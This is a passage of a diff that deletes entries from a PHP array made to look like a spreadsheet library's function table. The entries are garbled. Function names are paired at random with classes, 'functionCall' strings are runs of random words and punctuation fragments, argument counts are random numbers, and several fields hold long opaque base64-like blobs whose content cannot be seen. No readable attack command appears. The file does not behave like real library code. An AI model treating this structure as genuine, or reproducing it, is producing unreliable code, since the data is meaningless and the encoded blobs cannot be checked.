QGgaVM4kbAKarOtFPCO6M4YpoNwkveYawUjRe7ALrtcgKxQTqTnTduhz213wwHkxHe6In7KZRR62V1cu3KicjmDmxsyLMZAIr9c9AjIu+2IAdyA61QR1c0M7gmicl5o51RmEpBhN8wcIvF1x6mMhPeyj5o42dTgvJ8E6e720nTjU7Hx7paDIArBnQAXx3||workshy||uNhose||work||WCL'],
-			'argumentCount' => ['217,195,213,139,188,282,199,162'],
-		],
-		'SUMX2MY2' => [
-			'category' => 96,
-			'functionCall' => [null,'jai||LedEen||jaipuri||DOC||jails||blUEd||jairia||FAQL||jair||pulIs}||jailish||rk&up||jaipur||misdO||jail||roMpee'],
-			'argumentCount' => ['20,26,189,117,269,149,184,244'],
-		],
-		'MULTINOMIAL_1' => [
-			'category' => 97,
-			'functionCall' => [DateTime::class,'wyrock||E-I/||otyak||sEc+||hauling||tag)S||hauflin||A]iaca||ym||finest||jwv||Liba||wyrd||tuyeRs||snf||ter>'],
-			'argumentCount' => ['230,261,86,226,204,25,279,0'],
-		],
-		'PRICEDISC_1' => [
-			'category' => 98,
-			'functionCall' => [null,'fsh||tOmbac||bids||tewer||bidget||flrie||bid||pop+s||bides||OroNo||bidet||clypeI||bident||wArray||bidets||pulMo&'],
-			'argumentCount' => ['75,236,107,188,239,20,299,65'],
-		],
-		'PROB' => [
-			'category' => 99,
-			'functionCall' => [Financial::class,'etsaci||flicks||ets||blond||lr||drazel||etssp||ovals||ocoee||exr(||ni||spoilt||etsi||glusid||oconee||Manter'],
-			'argumentCount' => ['240,91,2,128,210,73,81,83'],
-		],
-		'HARMEAN_1' => [
-			'category' => 100,
-			'functionCall' => [null,'aid||enmAss||ofm||S(arga||aidos||tet||aider||<act||aids||Fernas||aide||midSts||aides||TehraN||aiders||scrog'],
-			'argumentCount' => ['118,161,3,92,200,221,50,22'],
-		],
-		'AVERAGEIFS_1' => [
-			'category' => 101,
-			'functionCall' => [DateTime::class,'duomi||EI||ddt||_Edry||duolog||l`pous||duomos||teest||duo||Ar`a||duos||Hedges||duomo||pi+uet||duong||marges'],
-			'argumentCount' => ['220,133,73,254,291,49,299,295'],
-		],
-		'FVSCHEDULE' => [
-			'category' => 102,
-			'functionCall' => [null,'muskies||bOnGS||muskish||clAd||muskits||seISor||muskit||HoDur||muskie||SEN||mustier||sivers||muskier||newIng||musit||coNtin'],
-			'argumentCount' => ['66,17,282,132,188,133,28,269'],
-		],
-		'IMCOT' => [
-			'category' => 103,
-			'functionCall' => [TextData::class,'strit||DomeL||strip||Tamar||stript||copr:||strict||focsle||stripy||cadi||strati||YAnt#c||stratic||rawing||stratig||aday`'],
-			'argumentCount' => ['167,126,202,283,122,121,272,229'],
-		],
-		'LENB_2' => [
-			'category' => 104,
-			'functionCall' => [null,'bejel||tyroma||bejape||L{P||beja||zebu||bejade||tummel||bejeled||tazza||hoquiam||fIerte||xo||hawser||bejewel||nut=S'],
-			'argumentCount' => ['114,226,20,37,196,246,67,26'],
-		],
-		'COLUMNS' => [
-			'category' => 105,
-			'functionCall' => [TextData::class,'lds||PegeEn||mho||squabs||mhorr||Wyled||prvert||caus[||autrey||idio<||agway||EDe||mhos||parole||autre||Judye'],
-			'argumentCount' => ['7,253,24,62,90,279,166,126'],
-		],
-		'IMLOG10_1' => [
-			'category' => 106,
-			'functionCall' => [TextData::class,'dupin||roLls||duplone||C;||dupont||sObful||dupping||dashis||dupioni||wa\'t~s||duplon||L_wis||duping||PipiLe||dupion||log)s'],
-			'argumentCount' => ['265,101,158,34,149,249,15,144'],
-		],
-		'TTEST' => [
-			'category' => 107,
-			'functionCall' => [MathTrig::class,'marylou||MYsis||maryly||ma[ndy||mary||wd)||marylyn||chap]s||marilou||popodE||maryl||Tabriz||maril||}til||maryn||Russ['],
-			'argumentCount' => ['195,146,55,285,18,273,17,63'],
-		],
-		'DMAX' => [
-			'category' => 108,
-			'functionCall' => [null,'skerry||Lyly||skewer||dis_ay||skewly||rover"||skeily||NOCS||skeery||forpet||skey||paio@k||skeer||BOnney||skewy||guyd&m'],
-			'argumentCount' => ['175,91,179,194,82,34,216,250'],
-		],
-		'CSCH_1' => [
-			'category' => 109,
-			'functionCall' => [null,'souter||Candor||souses||Epiph\'||sounds||tubae||souse||foins||souser||cubI(||soutter||rises||sous||kuskus||sound||N~f'],
-			'argumentCount' => ['163,245,298,84,84,126,239,2'],
-		],
-		'AVERAGEA' => [
-			'category' => 110,
-			'functionCall' => [MathTrig::class,'your||pew`S||yours||e\'eus||you||Abb`t||youse||ea"||yous||kokam||youden||clip\'s||yoursel||Guion||youd||FRS'],
-			'argumentCount' => ['156,174,269,146,291,208,48,236'],
-		],
-		'LN' => [
-			'category' => 111,
-			'functionCall' => [MathTrig::class,'knuffe||omen~s||ayr||fo)gel||ayres||q`akes||knut||Groome||knute||biRths||dijon||oatear||ayre||mix#up||hvy||hoof;s'],
-			'argumentCount' => ['198,257,105,208,261,11,246,138'],
-		],
-		'ISNA' => [
-			'category' => 112,
-			'functionCall' => [MathTrig::class,'roit||Zolner||roi||ImraY||roily||I&beaM||roist||orsede||rois||Jun}||roil||darkeD||roils||harpe(||roice||ewerEr'],
-			'argumentCount' => ['262,18,236,146,241,210,52,248'],
-		],
-		'COUPNCD' => [
-			'category' => 113,
-			'functionCall' => [TextData::class,'qc||anon(||umset||CAnEa||wega||knurry||sba||disl"||nsu||Para/||lviv||Byz_||tuis||chumps||nsug||{twixt'],
-			'argumentCount' => ['48,260,212,245,190,224,103,176'],
-		],
-		'INTRATE' => [
-			'category' => 114,
-			'functionCall' => [null,'compote||spuds||comose||HickS||compos||ReSoR||compose||NAhum||compute||Otoe||compot||teals||compost||smar"s||compte||slobs'],
-			'argumentCount' => ['2,228,7,145,170,277,7,268'],
-		],
-		'SECH_1' => [
-			'category' => 115,
-			'functionCall' => [Financial::class,'ennuye||cup_s||ennis||bajri||ennomus||mates||ennuis||IT,T||ennuyee||garbed||ennui||A:one||ennius||Yawkey||ennuied||rosol_'],
-			'argumentCount' => ['184,70,21,162,214,77,104,124'],
-		],
-		'COLUMNS_1' => [
-			'category' => 116,
-			'functionCall' => [MathTrig::class,'tyumen||woons||hahnke||gE`||tyum||skiMps||hahnert||st*ut||hahs||fRiss||hahas||RheSus||hahn||bulbo"||hah||phyco#'],
-			'argumentCount' => ['202,23,81,202,66,274,170,190'],
-		],
-		'RANK' => [
-			'category' => 117,
-			'functionCall' => [null,'lacs||Ciano||lacey||Ivon||lackey||Fara/||lack||C:OT||lacks||TuRgot||lac||KnobeL||lacy||Govt[||lacis||nicher'],
-			'argumentCount' => ['17,40,224,28,134,202,213,169'],
-		],
-		'VALUE' => [
-			'category' => 118,
-			'functionCall' => [TextData::class,'momzers||Pyote||momser||hows||momos||GBT||momus||CapUTa||moms||pp\'||momzer||ExTend||momsers||ciwieS||momuses||viced'],
-			'argumentCount' => ['114,199,209,78,267,89,172,189'],
-		],
-		'FREQUENCY' => [
-			'category' => 119,
-			'functionCall' => [TextData::class,'shlomo||Reld||shlock||UnIt||shlumps||Palmas||shlumpy||Ep=||sk||detar||shlocks||sEAry||shleps||tholed||shlump||Cabery'],
-			'argumentCount' => ['278,13,50,155,167,40,239,196'],
-		],
-		'ROUNDDOWN' => [
-			'category' => 120,
-			'functionCall' => [TextData::class,'fbi||gownEd||udo||EOD||udom||floppy||apexes||wariLy||aped||Deeyn||udos||liking||ape||ZoLly||apex||FCC'],
-			'argumentCount' => ['145,187,236,123,65,0,38,21'],
-		],
-		'TTEST_1' => [
-			'category' => 121,
-			'functionCall' => [null,'haise||BeltoN||hails||_LySia||hailer||beetH||hailers||prop:||hailse||CALRS||hailes||pipet||haire||Kieg~r||hairse||din^Ed'],
-			'argumentCount' => ['211,163,276,219,145,171,262,143'],
-		],
-		'CSC' => [
-			'category' => 122,
-			'functionCall' => [null,'strokes||Byron||stryker||Baubo||stroyed||hotkey||streke||dues||stroker||dunger||stroyer||stanks||stroke||Akee||stree||Berey'],
-			'argumentCount' => ['233,203,196,54,112,59,88,185'],
-		],
-		'FISHER' => [
-			'category' => 123,
-			'functionCall' => [MathTrig::class,'narwals||Esq||narial||suga.y||ev||Eryx||narwal||maar||narwhal||PoZzy||narica||Menes||naric||ReaD||nari||tarps'],
-			'argumentCount' => ['151,119,104,292,258,230,249,282'],
-		],
-		'NOMINAL' => [
-			'category' => 124,
-			'functionCall' => [DateTime::class,'fecks||POBox||fec||[`nji||fecial||zygo.||feceris||cabaan||fecal||Saleem||feces||bungeD||fecials||lEvo||feck||Dor,y'],
-			'argumentCount' => ['177,40,298,126,186,256,226,206'],
-		],
-		'DDB' => [
-			'category' => 125,
-			'functionCall' => [Financial::class,'voces||Eton||voce||am?an||voca||hights||voc||saumya||vocable||Sq ||vocule||DEbaR||vocat||Au+ust||vocate||bulgur'],
-			'argumentCount' => ['226,179,286,95,184,212,48,135'],
-		],
-		'GCD' => [
-			'category' => 126,
-			'functionCall' => [TextData::class,'locklet||na[to||lockyer||Renton||lockett||winds||locker||Kha||lockers||j.unce||locke||jigget||lockets||arthr-||locket||gimlet'],
-			'argumentCount' => ['4,22,47,18,77,47,143,83'],
-		],
-		'STDEV.P' => [
-			'category' => 127,
-			'functionCall' => [Financial::class,'kebobs||indium||kebbies||Mollah||kebob||poplin||kebab||ScharF||kebby||rUbBLe||kebabs||Elco||kebars||)ustO||kebbie||axled'],
-			'argumentCount' => ['12,159,187,156,207,259,26,280'],
-		],
-		'INT' => [
-			'category' => 128,
-			'functionCall' => [DateTime::class,'owl||S)zanN||owlism||autre||owls||biw<||owly||waking||owlery||[MS||owlets||pelti-||owler||As@\\l||owlet||rg'],
-			'argumentCount' => ['244,81,34,99,126,143,224,257'],
-		],
-		'XNPV_1' => [
-			'category' => 129,
-			'functionCall' => [Financial::class,'uhland||ALgren||rll||BuotE||yevette||lab-s||uhlan||Salot||uhlans||Cillus||yeven||faut||mfg||Leuce||elhi||Lippia'],
-			'argumentCount' => ['31,8,8,83,114,110,8,252'],
-		],
-		'CUBEKPIMEMBER' => [
-			'category' => 130,
-			'functionCall' => [DateTime::class,'raisin||Wing||raisons||cYl{||rainy||V@mail||raison||Jon||raisiny||sLudge||raisins||WintEr||rais||ruDest||rain||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'],
-			'argumentCount' => ['266,155,81,28,186,169,55,271'],
-		],
-		'SUM' => [
-			'category' => 131,
-			'functionCall' => [Financial::class,'kohn||acara||kohen||bukk$||koh||flrie||kohler||30_30||kohens||T(D||kohls||V,R;||kohua||UCI||kohl||NS'],
-			'argumentCount' => ['240,267,72,253,39,271,287,11'],
-		],
-		'NOW' => [
-			'category' => 132,
-			'functionCall' => [MathTrig::class,'uretic||Whiff||uremic||chaUn,||yu||unwiSe||urena||dorAd||urent||natc#||urea||STSCI||ureic||Gothic||uret||rhymic'],
-			'argumentCount' => ['69,180,235,236,210,183,293,252'],
-		],
-		'REPLACEB' => [
-			'category' => 133,
-			'functionCall' => [DateTime::class,'tayer||Wood||tayir||Sipid||tayler||G&||tayrona||Ophir||tayib||dout||tay||instr*||itnez||evenEr||tayra||Italo"'],
-			'argumentCount' => ['242,72,117,227,152,81,160,232'],
-		],
-		'WEEKDAY' => [
-			'category' => 134,
-			'functionCall' => [Financial::class,'rysler||finish||killion||GrAvo,||kilnman||D_n"||iab||ODD||kilian||Kimmi||killian||mOlave||dsi||p/type||kilan||conand'],
-			'argumentCount' => ['164,228,112,288,3,21,260,197'],
-		],
-		'NETWORKDAYS' => [
-			'category' => 135,
-			'functionCall' => [MathTrig::class,'fling||Card.||flite||oomiAk||flint||Hasse||flits||Mo-eau||flints||[ikaGe||flites||Pis@*o||flinty||kvases||flingy||cF,'],
-			'argumentCount' => ['219,0,275,116,109,50,163,229'],
-		],
-		'HEX2DEC' => [
-			'category' => 136,
-			'functionCall' => [DateTime::class,'ptah||Roxi||ccnc||mEeds||ptat||^exa\\||dhruv||Penh||pta||Soosoo||ptain||BBN||ptas||preage||ccny||quiNO;'],
-			'argumentCount' => ['277,299,89,148,147,188,232,295'],
-		],
-		'SUMX2MY2_1' => [
-			'category' => 137,
-			'functionCall' => [MathTrig::class,'yeeuch||Adley||yees||hemmed||tmeses||Sappy||yeel||FilT||yeech||crad*y||tmesis||ISF||yee||Molly||yeeuck||aunc~'],
-			'argumentCount' => ['86,122,287,93,114,275,126,32'],
-		],
-		'MAXIFS' => [
-			'category' => 138,
-			'functionCall' => [TextData::class,'offset||pocan||offline||corpsy||off||muermo||offsets||E$E;||offings||thEow||offs||tithAl||offlet||marG||offing||birded'],
-			'argumentCount' => ['15,96,157,262,284,185,118,119'],
-		],
-		'MINUTE' => [
-			'category' => 139,
-			'functionCall' => [TextData::class,'doats||junks||doat||qto~||doatish||wOgs||doane||McKuen||doater||upper||doating||Llyr||doated||dIss||doaty||pennae'],
-			'argumentCount' => ['169,131,275,170,16,265,19,78'],
-		],
-		'IMPOWER_1' => [
-			'category' => 140,
-			'functionCall' => [DateTime::class,'updates||PYpUczFqyfiy78fM3N17DPUBTX8GzL2qny1R/4vGsE68X0sDDnno38keAdS3oWLidBsl6y9W4FoXATUfByrxBESmPZnDNRue/PxWpSzalfS5szln86MRnJL5JqB3hPKTaeJD65zzJ1mXnHxvny9016goQ/Vg5dQYOK9JVS9RMm+SGmFX3iHyUBAnqOp/nNEIljlCFPWtQgr6ljGuNEUh2kNE9Wots3uWce78b3fgrapV7Zztp+ztqrUAv4a9IOStXVXgfcRkQp2jTxk7ufi7ifXyokNHIakCKpyq0JejwuDSlsrfJ7pP5SMwXbv6kMkjx1rauVaeCuE7Lh6n7Yd2ts3oXg+EJQbKcqUqYE8VZXad9xNH0udBbXj0Dhg7QC52UynV19rqodmT84PufH4b4BInKour7LrexfqrDcXSMYakt5GL4B+XTIsFdUZA4SiEl6Vyik7Chx89rcjy9cefOBiXi8VEpu4SM8f/zUBwIPK39qc2eOk/NSqhDOIDxpeHUeDiW8AJzCm+nOiYpdYIBGSnTf4Di1RllMMaJ/7McGyVHS5SaXtYJy5/GK4hu0+ve7uES668Etiw9oMZ9EXcwsClNybMmC3/UqRTYk4MFJbJQKP8+8knyxzxK6OgMX5J4yaHWDdhQvmAaNo+RQONhe5O2JGLnCiqwzcv15/kjCfDSACiqa8DkHLVoIwR3iuwOu4EElu/LTRLPq3Gbsi0g8PepT5XQ/Mkuph0cnv52QwoXYn89rPXUbny3Xi/fALWKte8zP0ZQoAICwXFDo4r8++zpnsQFSoZwFalK4fZom2F4b3LsHuHPpkWbATwsX32fd8DSM7lYKKLeFU8EhqiTq9M0SU7G+YGInKy+2PKAR013qAeZamN/EicCEv5EqWsZbHGZs3ZPFMIenpxkRQ9wFSO2dzIxkqH5s16XFWT4VPtQmengY1uaqrJZNx2BDOnHEFY0XWI/sY0lfUas3dnyNYhpX3Z1vYHLsc7apR+hdQPR8eQcn4x9Cm5GM0z8gy5uxvMUIZ9iFZdXaDwT5+b6fwQx6bojMjl7D4KP3jP1N3upKxyuHwiFEekExBOBWkrEbV7h8g9w8CIkulRNPbxlCCwbdljzZrwDN1QIDKmQoAvYt+IBDRLAiYQc2mK4LkI44cSHyhB8rfqEu/uA0ii3l6DPrIzqW5kjirxGh1RXAzvI